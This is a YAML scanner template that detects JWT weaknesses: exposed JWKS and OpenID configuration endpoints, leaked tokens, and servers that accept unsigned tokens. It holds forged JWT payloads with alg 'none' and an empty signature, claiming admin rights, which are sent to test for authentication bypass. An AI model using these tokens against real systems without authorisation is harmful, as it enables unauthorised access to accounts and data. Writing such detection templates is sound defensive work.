id: jwt-misconfiguration-detection

info:
  name: JWT Misconfiguration & Weakness Detection
  author: achraf-chehboun
  severity: high
  description: |
    Detects JWT misconfigurations including "none" algorithm acceptance, missing
    signature verification, and JWK/JWKS endpoint exposure. Uses a two-phase
    approach: first verifies the endpoint rejects invalid tokens (401/403), then
    tests if none-alg tokens are accepted. Requires JSON content-type to eliminate
    false positives from HTML catch-all pages.
  reference:
    - https://owasp.org/Top10/A01_2021-Broken_Access_Control/
    - https://portswigger.net/web-security/jwt
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cwe-id: CWE-345
  metadata:
    max-request: 10
  tags: owasp-top10,broken-access-control,jwt,authentication,detection-only

variables:
  jwt_none: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0IiwiYWRtaW4iOnRydWV9."
  jwt_None: "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0IiwiYWRtaW4iOnRydWV9."
  jwt_nOnE: "eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0IiwiYWRtaW4iOnRydWV9."
  jwt_empty_sig: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0IiwiYWRtaW4iOnRydWV9."

http:
  # JWKS endpoint exposure
  - method: GET
    path:
      - "{{BaseURL}}/.well-known/jwks.json"
      - "{{BaseURL}}/jwks.json"
      - "{{BaseURL}}/oauth/jwks"
      - "{{BaseURL}}/.well-known/openid-configuration"

    stop-at-first-match: false
    matchers-condition: or
    matchers:
      - type: dsl
        name: jwks-exposed
        dsl:
          - 'status_code == 200 && contains(content_type, "json") && contains(body, "\"keys\"") && (contains(body, "\"kty\"") || contains(body, "\"n\""))'

      - type: dsl
        name: openid-config-exposed
        dsl:
          - 'status_code == 200 && contains(content_type, "json") && contains(body, "jwks_uri") && contains(body, "issuer")'

    extractors:
      - type: regex
        name: jwks-key-types
        group: 1
        regex:
          - '"kty"\s*:\s*"([^"]+)"'

  # None algorithm: baseline (invalid token) MUST get 401/403, then none-alg token
  - raw:
      - |
        GET {{BaseURL}}/api/profile HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer invalid.token.xnlbz
        Accept: application/json
      - |
        GET {{BaseURL}}/api/profile HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{jwt_none}}
        Accept: application/json
      - |
        GET {{BaseURL}}/api/profile HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{jwt_None}}
        Accept: application/json

    req-condition: true
    matchers:
      - type: dsl
        name: none-alg-accepted
        dsl:
          - '(status_code_1 == 401 || status_code_1 == 403) && status_code_2 == 200 && contains(content_type_2, "json") && !contains(body_2, "<html")'
          - '(status_code_1 == 401 || status_code_1 == 403) && status_code_3 == 200 && contains(content_type_3, "json") && !contains(body_3, "<html")'
        condition: or

  # Empty signature: baseline must reject, empty sig must succeed
  - raw:
      - |
        GET {{BaseURL}}/api/profile HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer invalid.token.xnlbz
        Accept: application/json
      - |
        GET {{BaseURL}}/api/profile HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{jwt_empty_sig}}
        Accept: application/json

    req-condition: true
    matchers:
      - type: dsl
        name: empty-sig-accepted
        dsl:
          - '(status_code_1 == 401 || status_code_1 == 403) && status_code_2 == 200 && contains(content_type_2, "json") && !contains(body_2, "<html")'

  # JWT leakage in response body
  - method: GET
    path:
      - "{{BaseURL}}"
      - "{{BaseURL}}/api"

    matchers:
      - type: regex
        name: jwt-leakage-in-response
        regex:
          - 'eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{5,}'
        part: body

    extractors:
      - type: regex
        name: leaked-jwt
        group: 0
        regex:
          - '(eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{5,})'
